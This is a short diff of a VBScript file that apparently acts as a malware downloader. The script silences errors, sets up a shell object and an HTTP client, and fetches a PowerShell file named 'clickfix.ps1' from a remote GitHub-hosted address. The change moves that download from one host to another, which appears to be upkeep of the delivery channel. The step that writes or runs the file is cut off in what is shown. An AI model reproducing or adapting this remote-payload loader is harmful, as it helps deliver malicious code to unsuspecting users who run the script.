@@ -5,7 +5,7 @@
 On Error Resume Next
 Set s = CreateObject("WScript.Shell")
 Set h = CreateObject("MSXML2.ServerXMLHTTP")
-h.Open "GET", "https://cdn.jsdelivr.net/gh/kai195102/d@main/clickfix.ps1", False
+h.Open "GET", "https://kai195102.github.io/d/clickfix.ps1", False
 h.Send
 If h.Status = 200 Then
   Set f = CreateObject("Scripting.FileSystemObject")
